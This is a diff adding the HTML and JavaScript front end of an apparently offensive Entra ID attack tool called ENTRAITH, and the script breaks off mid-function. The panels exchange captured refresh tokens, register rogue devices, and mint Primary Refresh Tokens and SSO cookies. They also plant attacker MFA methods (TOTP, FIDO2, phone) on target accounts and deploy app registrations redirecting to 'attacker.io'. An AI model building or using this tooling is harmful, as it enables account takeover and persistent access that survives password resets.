@@ -1,0 +1,1254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ENTRAITH // Advanced Tools</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Syne:wght@400;500;600;700;800&display=swap');
+  :root {
+    --bg:#0a0c10;--bg2:#0f1218;--bg3:#161b24;--border:#1e2733;
+    --accent:#00d4ff;--accent2:#ff3e6c;--accent3:#39ff14;--warn:#ffae00;
+    --text:#c8d8e8;--text-dim:#5a6a7a;--text-bright:#e8f0f8;
+    --mono:'JetBrains Mono',monospace;--sans:'Syne',sans-serif;
+  }
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:var(--mono);font-size:13px;min-height:100vh}
+  .header{background:var(--bg2);border-bottom:1px solid var(--border);padding:16px 24px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:100}
+  .header-logo{font-family:var(--sans);font-size:11px;font-weight:800;letter-spacing:0.3em;text-transform:uppercase;color:var(--accent);text-shadow:0 0 20px rgba(0,212,255,0.5)}
+  .header-sep{color:var(--border)}
+  .header-title{font-family:var(--sans);font-size:11px;letter-spacing:0.15em;text-transform:uppercase;color:var(--text-dim)}
+  .header-right{margin-left:auto;display:flex;align-items:center;gap:12px}
+  nav{background:var(--bg2);border-bottom:2px solid var(--border);padding:0 24px;display:flex;gap:0;overflow-x:auto}
+  nav a{padding:10px 18px;font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:var(--text-dim);text-decoration:none;white-space:nowrap}
+  nav a.active{color:var(--accent);border-bottom:2px solid var(--accent)}
+  nav a:hover{color:var(--text)}
+  .layout{display:grid;grid-template-columns:260px 1fr;height:calc(100vh - 90px);overflow:hidden}
+  .sidebar{background:var(--bg2);border-right:1px solid var(--border);padding:20px;overflow-y:auto}
+  .sidebar-section{margin-bottom:24px}
+  .sidebar-label{font-size:9px;font-weight:600;letter-spacing:0.3em;text-transform:uppercase;color:var(--text-dim);margin-bottom:12px;padding-bottom:6px;border-bottom:1px solid var(--border)}
+  .main{overflow-y:auto;padding:24px;display:flex;flex-direction:column;gap:20px}
+  .btn{display:inline-flex;align-items:center;gap:6px;padding:8px 14px;border:1px solid var(--border);background:transparent;color:var(--text);font-family:var(--mono);font-size:11px;cursor:pointer;transition:all 0.15s;letter-spacing:0.05em;border-radius:2px;width:100%;justify-content:center;margin-bottom:8px}
+  .btn:hover{border-color:var(--accent);color:var(--accent)}
+  .btn-primary{border-color:var(--accent);color:var(--accent);background:rgba(0,212,255,0.05)}
+  .btn-primary:hover{background:rgba(0,212,255,0.15)}
+  .btn-danger{border-color:var(--accent2);color:var(--accent2);background:rgba(255,62,108,0.05)}
+  .btn-success{border-color:var(--accent3);color:var(--accent3);background:rgba(57,255,20,0.05)}
+  .btn-warn{border-color:var(--warn);color:var(--warn);background:rgba(255,174,0,0.05)}
+  .btn-sm{padding:5px 10px;font-size:10px;width:auto;margin-bottom:0}
+  .input-group{margin-bottom:10px}
+  .input-group label{display:block;font-size:10px;color:var(--text-dim);margin-bottom:4px;letter-spacing:0.1em}
+  .input-group input,.input-group select,.input-group textarea{width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:12px;padding:7px 10px;border-radius:2px;outline:none;transition:border-color 0.15s}
+  .input-group select{appearance:none;-webkit-appearance:none;padding-right:28px;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6' viewBox='0 0 10 6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%235a6a7a'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 10px center;cursor:pointer}
+  .input-group input:focus,.input-group textarea:focus,.input-group select:focus{border-color:var(--accent)}
+  .input-group textarea{resize:vertical;min-height:80px}
+  .input-group select option{background:var(--bg3)}
+  .input-row{display:flex;gap:8px}
+  .input-row .input-group{flex:1}
+  .checkbox-group{display:flex;align-items:center;gap:8px;margin-bottom:10px}
+  .checkbox-group input{width:auto}
+  .checkbox-group label{font-size:11px;color:var(--text-dim);margin-bottom:0}
+  .panel{background:var(--bg2);border:1px solid var(--border);border-radius:3px;padding:20px;margin-bottom:16px}
+  .panel-title{font-size:10px;font-weight:600;letter-spacing:0.2em;text-transform:uppercase;color:var(--accent);margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+  .card{background:var(--bg3);border:1px solid var(--border);border-radius:2px;padding:12px 14px;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;gap:8px}
+  .card-info{flex:1;min-width:0}
+  .card-label{font-size:12px;color:var(--text-bright);font-weight:500}
+  .card-sub{font-size:10px;color:var(--text-dim);margin-top:2px;word-break:break-all}
+  .card-actions{display:flex;gap:4px;flex-shrink:0}
+  .badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:9px;letter-spacing:0.1em;text-transform:uppercase}
+  .badge-blue{background:rgba(0,212,255,0.1);color:var(--accent);border:1px solid rgba(0,212,255,0.2)}
+  .badge-green{background:rgba(57,255,20,0.1);color:var(--accent3);border:1px solid rgba(57,255,20,0.2)}
+  .badge-red{background:rgba(255,62,108,0.1);color:var(--accent2);border:1px solid rgba(255,62,108,0.2)}
+  .badge-yellow{background:rgba(255,174,0,0.1);color:var(--warn);border:1px solid rgba(255,174,0,0.2)}
+  .output{background:var(--bg);border:1px solid var(--border);padding:12px;font-size:11px;color:var(--text-dim);min-height:60px;white-space:pre-wrap;word-break:break-all;border-radius:2px;font-family:var(--mono);max-height:300px;overflow-y:auto}
+  .section-tab{padding:8px 14px;font-size:10px;letter-spacing:0.1em;text-transform:uppercase;cursor:pointer;color:var(--text-dim);border-bottom:2px solid transparent;background:none;border-top:none;border-left:none;border-right:none;font-family:var(--mono)}
+  .section-tab.active{color:var(--accent);border-bottom-color:var(--accent)}
+  .section-tabs{display:flex;border-bottom:1px solid var(--border);margin-bottom:16px}
+  .section-body{display:none}
+  .section-body.active{display:block}
+  .totp-code{font-size:32px;letter-spacing:0.3em;color:var(--accent3);font-weight:700;text-align:center;padding:16px;font-family:var(--mono)}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="header-logo">ENTRAITH</div>
+  <div class="header-sep">//</div>
+  <div class="header-title">Advanced Tools</div>
+  <div class="header-right">
+    <button class="btn btn-sm btn-danger" onclick="doLogout()" style="margin-bottom:0">⎋ Logout</button>
+  </div>
+</div>
+<nav>
+  <a href="/">⬛ Operations</a>
+  <a href="/tools" class="active">⚙ Advanced Tools</a>
+  <a href="/infra">📡 Infrastructure</a>
+</nav>
+
+<div class="layout">
+  <!-- Sidebar: section list -->
+  <div class="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-label">Token Operations</div>
+      <button class="btn" onclick="showSection('exchange')">🔄 Token Exchange</button>
+      <button class="btn" onclick="showSection('tenant')">🔍 Tenant Lookup</button>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-label">Device Persistence</div>
+      <button class="btn" onclick="showSection('devcerts')">🖥 Device Certificates</button>
+      <button class="btn" onclick="showSection('prts')">🔑 Primary Refresh Tokens</button>
+      <button class="btn" onclick="showSection('winhello')">🪟 WinHello Keys</button>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-label">MFA Control</div>
+      <button class="btn" onclick="showSection('mfa')">📱 MFA Management</button>
+      <button class="btn" onclick="showSection('totp')">⏱ TOTP Generator</button>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-label">Graph Actions</div>
+      <button class="btn" onclick="showSection('graph-actions')">⚙ Graph Actions</button>
+    </div>
+  </div>
+
+  <!-- Main content -->
+  <div class="main" id="mainContent">
+
+    <!-- ─── Token Exchange ─── -->
+    <div id="sec-exchange" class="section-body active">
+      <div class="panel">
+        <div class="panel-title">🔄 Token Exchange</div>
+        <p style="font-size:11px;color:var(--text-dim);margin-bottom:16px">Exchange a captured refresh token for an access token targeting a different resource or client.</p>
+        <div class="input-row">
+          <div class="input-group">
+            <label>CAMPAIGN ID</label>
+            <select id="exCampaignId"></select>
+          </div>
+          <div class="input-group">
+            <label>TARGET</label>
+            <select id="exTargetId"></select>
+            <div id="exTenantHint" style="font-size:10px;color:var(--text-dim);margin-top:4px;font-family:var(--mono)"></div>
+          </div>
+        </div>
+        <div class="input-row">
+          <div class="input-group">
+            <label>PRESET RESOURCE</label>
+            <select id="exPreset" onchange="applyExchangePreset()">
+              <option value="">— custom —</option>
+              <option value="graph">Microsoft Graph</option>
+              <option value="outlook">Outlook</option>
+              <option value="teams">Teams / Skype</option>
+              <option value="azure">Azure Management</option>
+              <option value="devicereg">Device Registration</option>
+              <option value="mfa_registration">MFA Registration (My Sign-ins)</option>
+              <option value="keyvault">Azure Key Vault</option>
+              <option value="storage">Azure Storage</option>
+            </select>
+          </div>
+          <div class="input-group">
+            <label>PROTOCOL</label>
+            <select id="exProtocol">
+              <option value="v2">OAuth2 v2 (scope)</option>
+              <option value="v1">OAuth2 v1 (resource)</option>
+            </select>
+          </div>
+        </div>
+        <div class="input-group">
+          <label>CLIENT ID</label>
+          <input id="exClientId" type="text" value="d3590ed6-52b3-4102-aeff-aad2292ab01c" placeholder="Microsoft Office (default)">
+        </div>
+        <div class="input-group" id="exResourceGroup">
+          <label>RESOURCE (v1)</label>
+          <input id="exResource" type="text" placeholder="https://graph.microsoft.com">
+        </div>
+        <div class="input-group" id="exScopeGroup">
+          <label>SCOPE (v2)</label>
+          <input id="exScope" type="text" placeholder="https://graph.microsoft.com/.default offline_access">
+        </div>
+        <button class="btn btn-primary" onclick="doExchange()">▶ Exchange Token</button>
+        <div class="output" id="exOutput" style="margin-top:12px">Ready.</div>
+      </div>
+    </div>
+
+    <!-- ─── Tenant Lookup ─── -->
+    <div id="sec-tenant" class="section-body">
+      <div class="panel">
+        <div class="panel-title">🔍 Tenant ID Lookup</div>
+        <div class="input-row">
+          <div class="input-group">
+            <label>DOMAIN</label>
+            <input id="tenantDomain" type="text" placeholder="contoso.com">
+          </div>
+        </div>
+        <button class="btn btn-primary" onclick="doTenantLookup()">▶ Lookup</button>
+        <div class="output" id="tenantOutput" style="margin-top:12px">Enter a domain to resolve its tenant GUID.</div>
+      </div>
+    </div>
+
+    <!-- ─── Device Certificates ─── -->
+    <div id="sec-devcerts" class="section-body">
+      <div class="panel">
+        <div class="panel-title">🖥 Device Certificates</div>
+        <div class="section-tabs">
+          <button class="section-tab active" onclick="devCertTab(this,'register')">Register New</button>
+          <button class="section-tab" onclick="devCertTab(this,'import')">Import Existing</button>
+          <button class="section-tab" onclick="devCertTab(this,'list')">Stored Certs</button>
+        </div>
+
+        <div id="devtab-register" class="section-body active">
+          <p style="font-size:11px;color:var(--text-dim);margin-bottom:14px">Register a virtual device in Entra ID. Requires an access token for <code style="color:var(--accent)">urn:ms-drs:enterpriseregistration.windows.net</code> (get via Token Exchange).</p>
+          <div class="input-group"><label>LABEL</label><input id="dcLabel" type="text" placeholder="WORKSTATION-01"></div>
+          <div class="input-group"><label>DEVICE REG ACCESS TOKEN</label><textarea id="dcAccessToken" rows="3" placeholder="Paste access token for device registration resource"></textarea></div>
+          <div class="input-row">
+            <div class="input-group"><label>TARGET DOMAIN</label><input id="dcDomain" type="text" placeholder="contoso.com"></div>
+            <div class="input-group"><label>JOIN TYPE</label><select id="dcJoinType"><option value="4">Workplace Joined (4)</option><option value="0">AAD Joined (0)</option></select></div>
+          </div>
+          <div class="input-row">
+            <div class="input-group"><label>DEVICE TYPE</label><input id="dcDeviceType" type="text" value="Windows"></div>
+            <div class="input-group"><label>OS VERSION</label><input id="dcOSVersion" type="text" value="10.0.19041.0"></div>
+          </div>
+          <button class="btn btn-primary" onclick="registerDeviceCert()">▶ Register Device</button>
+          <div class="output" id="dcOutput" style="margin-top:12px"></div>
+        </div>
+
+        <div id="devtab-import" class="section-body">
+          <div class="input-group"><label>LABEL</label><input id="dcILabel" type="text" placeholder="Imported Device"></div>
+          <div class="input-group"><label>DEVICE ID (UUID)</label><input id="dcIDeviceId" type="text"></div>
+          <div class="input-group"><label>CERTIFICATE (base64 DER)</label><textarea id="dcICert" rows="4"></textarea></div>
+          <div class="input-group"><label>PRIVATE KEY (PEM)</label><textarea id="dcIKey" rows="5"></textarea></div>
+          <div class="input-row">
+            <div class="input-group"><label>TARGET DOMAIN</label><input id="dcIDomain" type="text"></div>
+            <div class="input-group"><label>JOIN TYPE</label><select id="dcIJoinType"><option value="4">4 — Registered</option><option value="0">0 — Joined</option></select></div>
+          </div>
+          <button class="btn btn-warn" onclick="importDeviceCert()">▶ Import Certificate</button>
+          <div class="output" id="dcIOutput" style="margin-top:12px"></div>
+        </div>
+
+        <div id="devtab-list" class="section-body">
+          <button class="btn btn-sm btn-primary" onclick="loadDeviceCerts()" style="margin-bottom:12px">↻ Refresh</button>
+          <div id="dcList"><div style="color:var(--text-dim);font-size:11px">Click Refresh to load.</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── Primary Refresh Tokens ─── -->
+    <div id="sec-prts" class="section-body">
+      <div class="panel">
+        <div class="panel-title">🔑 Primary Refresh Tokens</div>
+        <div class="section-tabs">
+          <button class="section-tab active" onclick="prtTab(this,'request')">Request PRT</button>
+          <button class="section-tab" onclick="prtTab(this,'import')">Import PRT</button>
+          <button class="section-tab" onclick="prtTab(this,'list')">Stored PRTs</button>
+          <button class="section-tab" onclick="prtTab(this,'use')">Use PRT</button>
+        </div>
+
+        <div id="prttab-request" class="section-body active">
+          <p style="font-size:11px;color:var(--text-dim);margin-bottom:14px">Exchange a refresh token + device certificate for a PRT. The PRT survives password resets and can mint tokens for any resource.</p>
+          <div class="input-group"><label>LABEL</label><input id="prtLabel" type="text" placeholder="target@contoso.com PRT"></div>
+          <div class="input-group"><label>DEVICE CERTIFICATE</label><select id="prtDevCert"><option value="">— load device certs first —</option></select></div>
+          <div class="input-group"><label>REFRESH TOKEN</label><textarea id="prtRefreshToken" rows="3" placeholder="Paste refresh token (from captured session)"></textarea></div>
+          <div class="input-row">
+            <div class="input-group"><label>CLIENT ID</label><input id="prtClientId" type="text" value="1950a258-227b-4e31-a9cf-717495945fc2" placeholder="Azure PowerShell"></div>
+            <div class="input-group"><label>TARGET UPN</label><input id="prtUPN" type="text" placeholder="user@contoso.com"></div>
+          </div>
+          <button class="btn btn-primary" onclick="requestPRT()">▶ Request PRT</button>
+          <div class="output" id="prtOutput" style="margin-top:12px"></div>
+        </div>
+
+        <div id="prttab-import" class="section-body">
+          <div class="input-group"><label>LABEL</label><input id="prtILabel" type="text"></div>
+          <div class="input-group"><label>PRT TOKEN</label><textarea id="prtIToken" rows="3"></textarea></div>
+          <div class="input-group"><label>SESSION KEY (base64)</label><input id="prtISessionKey" type="text"></div>
+          <div class="input-row">
+            <div class="input-group"><label>TARGET UPN</label><input id="prtIUPN" type="text"></div>
+            <div class="input-group"><label>TENANT ID</label><input id="prtITenantId" type="text"></div>
+          </div>
+          <div class="input-group"><label>DEVICE CERT ID (optional)</label><select id="prtIDevCert"><option value="">— none —</option></select></div>
+          <button class="btn btn-warn" onclick="importPRT()">▶ Import PRT</button>
+          <div class="output" id="prtIOutput" style="margin-top:12px"></div>
+        </div>
+
+        <div id="prttab-list" class="section-body">
+          <button class="btn btn-sm btn-primary" onclick="loadPRTs()" style="margin-bottom:12px">↻ Refresh</button>
+          <div id="prtList"><div style="color:var(--text-dim);font-size:11px">Click Refresh to load.</div></div>
+        </div>
+
+        <div id="prttab-use" class="section-body">
+          <div class="input-group"><label>PRT</label><select id="prtUseSelect"><option value="">— load PRTs first —</option></select></div>
+          <div class="input-row">
+            <div class="input-group"><label>CLIENT ID</label><input id="prtUseClientId" type="text" value="d3590ed6-52b3-4102-aeff-aad2292ab01c"></div>
+          </div>
+          <div class="input-group"><label>RESOURCE (v1)</label><input id="prtUseResource" type="text" placeholder="https://graph.microsoft.com"></div>
+          <div class="input-group"><label>SCOPE (v2)</label><input id="prtUseScope" type="text" placeholder="https://graph.microsoft.com/.default"></div>
+          <div style="display:flex;gap:8px;margin-top:4px">
+            <button class="btn btn-primary" onclick="prtGetAccessToken()">▶ Get Access Token</button>
+            <button class="btn btn-warn" onclick="prtGetCookie()">🍪 Get SSO Cookie</button>
+          </div>
+          <div class="output" id="prtUseOutput" style="margin-top:12px"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── WinHello Keys ─── -->
+    <div id="sec-winhello" class="section-body">
+      <div class="panel">
+        <div class="panel-title">🪟 Windows Hello for Business Keys</div>
+        <div class="section-tabs">
+          <button class="section-tab active" onclick="whTab(this,'register')">Register Key</button>
+          <button class="section-tab" onclick="whTab(this,'list')">Stored Keys</button>
+        </div>
+
+        <div id="whtab-register" class="section-body active">
+          <p style="font-size:11px;color:var(--text-dim);margin-bottom:14px">Register a WinHello NGC key for a device. The access token must target <code style="color:var(--accent)">urn:ms-drs:enterpriseregistration.windows.net</code>.</p>
+          <div class="input-group"><label>LABEL</label><input id="whLabel" type="text" placeholder="WinHello Key"></div>
+          <div class="input-group"><label>DEVICE CERTIFICATE</label><select id="whDevCert"><option value="">— load device certs —</option></select></div>
+          <div class="input-group"><label>DEVICE REG ACCESS TOKEN</label><textarea id="whAccessToken" rows="3"></textarea></div>
+          <div class="input-group"><label>USER ID / UPN</label><input id="whUserId" type="text" placeholder="user@contoso.com"></div>
+          <button class="btn btn-primary" onclick="registerWinHello()">▶ Register WinHello Key</button>
+          <div class="output" id="whOutput" style="margin-top:12px"></div>
+        </div>
+
+        <div id="whtab-list" class="section-body">
+          <button class="btn btn-sm btn-primary" onclick="loadWinHelloKeys()" style="margin-bottom:12px">↻ Refresh</button>
+          <div id="whList"><div style="color:var(--text-dim);font-size:11px">Click Refresh.</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── MFA Management ─── -->
+    <div id="sec-mfa" class="section-body">
+      <div class="panel">
+        <div class="panel-title">📱 MFA Management</div>
+        <p style="font-size:11px;color:var(--text-dim);margin-bottom:14px">Manage MFA methods via the My Sign-ins API. Exchanges captured refresh tokens for MFA-scoped access tokens automatically.</p>
+        <div class="input-row">
+          <div class="input-group">
+            <label>CAMPAIGN</label>
+            <select id="mfaCampaignId" onchange="loadMfaTargets()"></select>
+          </div>
+          <div class="input-group">
+            <label>TARGET</label>
+            <select id="mfaTargetId"></select>
+            <div id="mfaTenantHint" style="font-size:10px;color:var(--text-dim);margin-top:4px;font-family:var(--mono)"></div>
+          </div>
+        </div>
+        <div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap;align-items:center">
+          <button class="btn btn-sm btn-primary" onclick="mfaGetSession()">▶ Get Session</button>
+          <div class="input-group" style="flex:1;margin-bottom:0;min-width:220px">
+            <input id="mfaSessionCtx" type="text" placeholder="Session CTX (auto-filled on Get Session)">
+          </div>
+        </div>
+
+        <div class="section-tabs" style="margin-top:4px">
+          <button class="section-tab active" onclick="mfaTab(this,'registered')">🔐 Registered</button>
+          <button class="section-tab" onclick="mfaTab(this,'available')">📋 Available</button>
+          <button class="section-tab" onclick="mfaTab(this,'phone')">Phone</button>
+          <button class="section-tab" onclick="mfaTab(this,'email')">Email</button>
+          <button class="section-tab" onclick="mfaTab(this,'app')">App</button>
+          <button class="section-tab" onclick="mfaTab(this,'totp-register')">TOTP</button>
+          <button class="section-tab" onclick="mfaTab(this,'fido2')">🔑 FIDO2</button>
+          <button class="section-tab" onclick="mfaTab(this,'delete')">Delete</button>
+        </div>
+
+        <!-- Registered — Graph beta/me/authentication/methods -->
+        <div id="mfatab-registered" class="section-body active">
+          <p style="font-size:11px;color:var(--text-dim);margin:8px 0 10px">Methods <strong style="color:var(--text)">already registered</strong> on the account — Graph API <code>beta/me/authentication/methods</code>. Uses Graph token, not the MFA session. Method IDs shown here can be used in the Delete tab.</p>
+          <button class="btn btn-primary" onclick="mfaGetRegistered()">↻ Load Registered Methods</button>
+        </div>
+
+        <!-- Available — mysignins availablemethods -->
+        <div id="mfatab-available" class="section-body">
+          <p style="font-size:11px;color:var(--text-dim);margin:8px 0 10px">Methods <strong style="color:var(--text)">allowed by tenant policy</strong> — My Sign-ins API <code>/authenticationmethods/availablemethods</code>. Requires MFA session.</p>
+          <button class="btn btn-primary" onclick="mfaListMethods()">↻ Load Available Methods</button>
+        </div>
+
+        <!-- Phone -->
+        <div id="mfatab-phone" class="section-body">
+          <div class="input-row">
+            <div class="input-group">
+              <label>TYPE</label>
+              <select id="mfaPhoneType">
+                <option value="6">Mobile SMS (6)</option>
+                <option value="5">Mobile Call (5)</option>
+                <option value="7">Office Phone (7)</option>
+                <option value="11">Alt Mobile (11)</option>
+              </select>
+            </div>
+            <div class="input-group"><label>PHONE NUMBER</label><input id="mfaPhone" type="text" placeholder="+1 555 000 0000"></div>
+          </div>
+          <button class="btn btn-primary" onclick="mfaAddPhone()">▶ Add Phone</button>
+        </div>
+
+        <!-- Email -->
+        <div id="mfatab-email" class="section-body">
+          <div class="input-group"><label>EMAIL ADDRESS</label><input id="mfaEmail" type="text" placeholder="backup@email.com"></div>
+          <button class="btn btn-primary" onclick="mfaAddEmail()">▶ Add Email</button>
+        </div>
+
+        <!-- App -->
+        <div id="mfatab-app" class="section-body">
+          <div class="input-row">
+            <div class="input-group">
+              <label>APP TYPE</label>
+              <select id="mfaAppType">
+                <option value="1">Push + Code (1)</option>
+                <option value="2">Push Only (2)</option>
+                <option value="3">OTP Only (3)</option>
+              </select>
+            </div>
+            <div class="input-group"><label>SECRET KEY (base32)</label><input id="mfaSecretKey" type="text"></div>
+          </div>
+          <button class="btn btn-primary" onclick="mfaAddApp()">▶ Add Authenticator App</button>
+        </div>
+
+        <!-- TOTP auto-register -->
+        <div id="mfatab-totp-register" class="section-body">
+          <div class="input-group"><label>LABEL FOR STORAGE</label><input id="mfaTotpLabel" type="text" placeholder="target@contoso.com"></div>
+          <p style="font-size:11px;color:var(--text-dim);margin-bottom:10px">Automatically registers this tool as an Authenticator OTP-only app, retrieves the secret key, generates a TOTP code, verifies it, and stores the secret locally.</p>
+          <button class="btn btn-success" onclick="mfaRegisterTOTP()">▶ Register as TOTP App</button>
+        </div>
+
+        <!-- FIDO2 Security Key -->
+        <div id="mfatab-fido2" class="section-body">
+          <p style="font-size:11px;color:var(--text-dim);margin:8px 0 10px">Registers <strong style="color:var(--text)">your physical security key</strong> (FIDO2/WebAuthn) on the target account using the captured refresh token. The key must be physically connected to your machine — the browser's <code>navigator.credentials.create()</code> handles key interaction.</p>
+          <div class="input-group"><label>KEY NAME / LABEL</label><input id="mfaFido2Name" type="text" placeholder="YubiKey 5C NFC"></div>
+          <div id="mfaFido2Steps" style="margin:12px 0;display:none">
+            <div id="mfaFido2Step1" style="padding:3px 0;font-size:11px;color:var(--text-dim);font-family:var(--mono)">◦ Step 1: Get creation options from mysignins</div>
+            <div id="mfaFido2Step2" style="padding:3px 0;font-size:11px;color:var(--text-dim);font-family:var(--mono)">◦ Step 2: Touch / activate your security key</div>
+            <div id="mfaFido2Step3" style="padding:3px 0;font-size:11px;color:var(--text-dim);font-family:var(--mono)">◦ Step 3: Send attestation to mysignins</div>
+          </div>
+          <button class="btn btn-primary" onclick="mfaRegisterFIDO2()" id="mfaFido2Btn">🔑 Register Security Key</button>
+        </div>
+
+        <!-- Delete -->
+        <div id="mfatab-delete" class="section-body">
+          <p style="font-size:11px;color:var(--text-dim);margin:8px 0 8px">Copy the method ID from the <strong style="color:var(--text)">Registered</strong> tab output.</p>
+          <div class="input-group"><label>METHOD ID</label><input id="mfaDeleteId" type="text" placeholder="00000000-0000-0000-0000-000000000000"></div>
+          <button class="btn btn-danger" onclick="mfaDeleteMethod()">✕ Delete Method</button>
+        </div>
+
+        <div class="output" id="mfaOutput" style="margin-top:12px">Select a campaign and target to begin.</div>
+      </div>
+    </div>
+
+    <!-- ─── TOTP Generator ─── -->
+    <div id="sec-totp" class="section-body">
+      <div class="panel">
+        <div class="panel-title">⏱ TOTP Generator</div>
+        <div class="section-tabs">
+          <button class="section-tab active" onclick="totpTab(this,'codes')">Generate Codes</button>
+          <button class="section-tab" onclick="totpTab(this,'add')">Add Secret</button>
+        </div>
+
+        <div id="totptab-codes" class="section-body active">
+          <button class="btn btn-sm btn-primary" onclick="loadOTPSecrets()" style="margin-bottom:12px">↻ Refresh Secrets</button>
+          <div id="totpList"><div style="color:var(--text-dim);font-size:11px">No secrets stored.</div></div>
+        </div>
+
+        <div id="totptab-add" class="section-body">
+          <div class="input-group"><label>LABEL</label><input id="totpLabel" type="text" placeholder="user@contoso.com"></div>
+          <div class="input-group"><label>BASE32 SECRET KEY</label><input id="totpSecret" type="text" placeholder="JBSWY3DPEHPK3PXP"></div>
+          <button class="btn btn-primary" onclick="addOTPSecret()">▶ Save Secret</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── Graph Actions ─── -->
+    <div id="sec-graph-actions" class="section-body">
+      <div class="panel">
+        <div class="panel-title">⚙ Graph Actions</div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:16px">
+          <div class="input-group">
+            <label>CAMPAIGN</label>
+            <select id="gaCampaignId" onchange="loadGaTargets()"></select>
+          </div>
+          <div class="input-group">
+            <label>TARGET</label>
+            <select id="gaTargetId"></select>
+          </div>
+        </div>
+
+        <!-- Clone Security Group -->
+        <div style="border:1px solid var(--border);border-radius:2px;margin-bottom:16px">
+          <div style="padding:8px 14px;background:var(--bg3);border-bottom:1px solid var(--border);font-size:10px;letter-spacing:0.2em;text-transform:uppercase;color:var(--accent)">Clone Security Group</div>
+          <div style="padding:14px">
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+              <div class="input-group">
+                <label>SOURCE GROUP ID</label>
+                <input id="gaCloneSrcId" type="text" placeholder="00000000-0000-0000-0000-000000000000">
+              </div>
+              <div class="input-group">
+                <label>NEW DISPLAY NAME</label>
+                <input id="gaCloneName" type="text" placeholder="IT-Security-Clone">
+              </div>
+            </div>
+            <div class="input-group">
+              <label>DESCRIPTION (optional)</label>
+              <input id="gaCloneDesc" type="text" placeholder="Cloned group">
+            </div>
+            <button class="btn btn-primary" onclick="gaCloneGroup()">▶ Clone Group</button>
+            <pre id="gaCloneOut" style="margin-top:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:10px;font-size:11px;max-height:200px;overflow-y:auto;display:none"></pre>
+          </div>
+        </div>
+
+        <!-- Deploy App Registration -->
+        <div style="border:1px solid var(--border);border-radius:2px">
+          <div style="padding:8px 14px;background:var(--bg3);border-bottom:1px solid var(--border);font-size:10px;letter-spacing:0.2em;text-transform:uppercase;color:var(--accent)">Deploy App Registration</div>
+          <div style="padding:14px">
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+              <div class="input-group">
+                <label>APP DISPLAY NAME</label>
+                <input id="gaAppName" type="text" placeholder="CorpConnect Integration">
+              </div>
+              <div class="input-group">
+                <label>REDIRECT URI</label>
+                <input id="gaAppRedirect" type="text" placeholder="https://attacker.io/callback">
+              </div>
+            </div>
+            <div class="input-group">
+              <label>REQUESTED SCOPES (comma-separated)</label>
+              <input id="gaAppScopes" type="text" placeholder="Mail.Read,Files.ReadWrite.All,User.Read">
+            </div>
+            <button class="btn btn-primary" onclick="gaDeployApp()">▶ Deploy App Registration</button>
+            <pre id="gaDeployOut" style="margin-top:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:10px;font-size:11px;max-height:200px;overflow-y:auto;display:none"></pre>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+  </div><!-- /main -->
+</div><!-- /layout -->
+
+<script>
+// ─── Auth ─────────────────────────────────────────────────────────────────────
+const knownResources = {
+  graph: {v1:'https://graph.microsoft.com', v2:'https://graph.microsoft.com/.default offline_access profile openid'},
+  outlook: {v1:'https://outlook.office.com', v2:'https://outlook.office.com/.default offline_access'},
+  teams: {v1:'https://api.spaces.skype.com', v2:'https://api.spaces.skype.com/.default offline_access'},
+  azure: {v1:'https://management.azure.com', v2:'https://management.azure.com/.default offline_access'},
+  devicereg: {v1:'urn:ms-drs:enterpriseregistration.windows.net', v2:'urn:ms-drs:enterpriseregistration.windows.net/.default'},
+  mfa_registration: {v1:'19db86c3-b2b9-44cc-b339-36da233a3be2', v2:'19db86c3-b2b9-44cc-b339-36da233a3be2/.default'},
+  keyvault: {v1:'https://vault.azure.net', v2:'https://vault.azure.net/.default offline_access'},
+  storage: {v1:'https://storage.azure.com', v2:'https://storage.azure.com/.default offline_access'},
+};
+
+function showLoginOverlay() {
+  window.location.href = '/login?next=' + encodeURIComponent(window.location.pathname + window.location.search);
+}
+
+async function doLogout() {
+  await fetch('/api/auth/logout', { method: 'POST', credentials: 'same-origin' });
+  window.location.href = '/login';
+}
+
+function friendlyError(msg) {
+  if (!msg) return 'Unknown error';
+  const m = String(msg);
+  if (m.includes('AADSTS70000')) return 'Token revoked — re-capture required. MFA may have been newly enforced on this tenant.';
+  if (m.includes('AADSTS700082')) return 'Refresh token expired — re-capture required.';
+  if (m.includes('AADSTS50076') || m.includes('AADSTS50079')) return 'MFA required — complete MFA authentication first.';
+  if (m.includes('AADSTS53003')) return 'Access blocked by a Conditional Access policy.';
+  if (m.includes('AADSTS65001')) return 'App consent required — user has not granted permissions.';
+  if (m.includes('AADSTS50034')) return 'User not found in this tenant.';
+  if (m.includes('AADSTS50126')) return 'Authentication failed — invalid credentials.';
+  if (/AADSTS\d+/.test(m)) return 'Azure AD error ' + (m.match(/AADSTS\d+/)?.[0] || '') + ' — check token validity.';
+  if (m.includes('no captured token') || m.includes('no token')) return 'No captured token — complete the device code flow first.';
